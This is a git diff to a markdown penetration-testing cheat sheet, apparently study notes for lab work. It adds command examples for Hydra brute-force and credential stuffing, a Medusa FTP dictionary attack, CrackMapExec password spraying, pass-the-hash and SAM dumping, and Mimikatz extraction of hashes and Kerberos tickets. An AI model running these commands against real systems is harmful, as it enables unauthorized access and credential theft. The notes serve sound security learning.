@@ -1171,6 +1171,7 @@ Extension examples :
 - `JSON Web Tokens` : decode and manipulate JSON Web Tokens on the fly
 - `Retire.js` : identify vulnerable JS libraries (require Burp Suite Pro)
 - `Burp Bounty` : improve the active and passive scanner (require Burp Suite Pro)
+- `SAML Raider` : test SAML infrastructure by intercepting, decoding and altering SAML tokens
 
 
 ### Nikto
@@ -1748,7 +1749,7 @@ hashcat -a 0 -m 0 hash.txt dict.txt                # try to find a password in a
                                                    #   -m to specify the hashing method (0 : MD5)
                                                    #   -a to specify the attack mode (0 : straight, 1 : combination, 3 : mask)
 hashcat -a 1 -m 0 hash.txt dict.txt rockyou.txt    # try to find a password in multiple dicts
-hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l            # try to find a password of 6 lower letters
+hashcat -a 3 -m 0 hash.txt ?l?l?l?l?l?l            # try to find a password following a given mask pattern (6 lower letters)
 ```
 
 Note : to get the hash for a given string, we can use an online hash tool, the `md5sum` command in Linux or the `Get-FileHash` PowerShell command :
@@ -1952,12 +1953,15 @@ It sends the login attempts one-by-one to the target and checks the response for
 
 Unlike Hashcat or John the Ripper, it is not an offline password cracking tool.  
 It does not check passwords against a target hash, but against a target network system (so it can be detected).  
-For common protocol, it can detect automatically if an attempt is successful or not.  
+For common protocols, it can detect automatically if an attempt is successful or not.  
 For HTTP login against a custom website, it needs to know the message to expect in case of failure.  
 
 Hydra has a GTK+ based GUI version called `hydra-gtk`.
 
 ```shell
+# brute-force attack of all passwords from 4 to 8 alpha-numeric characters 
+hydra -l testuser -x 4:8:abcdefghijklmnopqrstuvwxyz1234567890 ssh://<TARGET_IP>
+
 # try all passwords in a word list to access the target IP in SSH with a given user (login)
 # -f to stop when a valid password is found
 # -v for verbose logging
@@ -1971,6 +1975,68 @@ hydra -l '' -P pins.txt -f -v 10.10.131.34 http-post-form "/login.php:pin=^PASS^
 # try all passwords from a word list to authenticate as a given user to a HTML form
 # similar to the previous example, but with a user, that is added to the POST body with the ^USER^ placeholder
 hydra -l testuser -P rockyou.txt 10.10.131.34 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
+
+# credential stuffing attack, using a list of users and their corresponding password from a previous breach
+# hydra can try each credentials pair and report the successful ones
+hydra -L usernames.txt -P passwords.txt 10.10.131.34 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
+```
+
+
+### Medusa
+
+Medusa is an alternative to Hydra to crack passwords for online services.  
+Just like Hydra, it supports a variety of services (SSH, FTP, HTTP...).  
+It is slightly slower than Hydra, but it supports parallel attack on multiple target hosts.  
+
+```shell
+# dictionary attack on an FTP account
+medusa -h <TARGET_IP> -u testuser -P rockyou.txt -M ftp
+```
+
+
+### CrackMapExec (CME)
+
+CrackMapExec is a post-exploitation tool used for network enumeration, credential validation an lateral movements on Windows target machines.  
+It is also used to automate credential-based attacks, like password spraying or pass-the-hash attacks on services supporting authentication by hash.
+
+CrackMapExec is no longer maintained, so its effectiveness is decreasing over time.  
+Its maintainer retired in 2023, and the main remaining contributors created **NetExec** as its successor.
+
+```shell
+# enumerate SMB shares
+crackmapexec smb 192.168.1.0/24 --shares
+
+# check for SMB guest access
+crackmapexec smb 192.168.1.10 -u '' -p ''
+
+# authenticate with SMB credentials to validate them
+crackmapexec smb 192.168.1.10 -u testuser -p qwerty
+
+# password spraying of a single password against several users and/or hosts on the SMB service
+crackmapexec smb <TARGET_IP_OR_RANGE> -u users.txt -p qwerty
+
+# pass the hash attack : log in using a hash and run a command prompt on the target
+crackmapexec smb <TARGET_IP> -u testuser -H <HASH>
+
+# execute a command over SMB (require Administrator privileges)
+crackmapexec smb <TARGET_IP> -u testuser -p qwerty -x 'ipconfig'
+
+# dump SAM hashes over SMB (require SYSTEM privileges, above Administrator)
+crackmapexec smb <TARGET_IP> -u testuser -p qwerty --sam
+```
+
+
+### Mimikatz
+
+Mimikatz is an open-source post-exploitation tool to extract authentication credentials from a Windows target machine.  
+It is used to extract NTLM hashes and Kerberos tickets from the target's memory.
+
+```shell
+# extract the NTLM hashes from memory
+ mimikatz # sekurlsa::logonpasswords
+
+# extract from memory the Kerberos tickets present on the machine
+mimikatz # kerberos::list /export
 ```
 
 
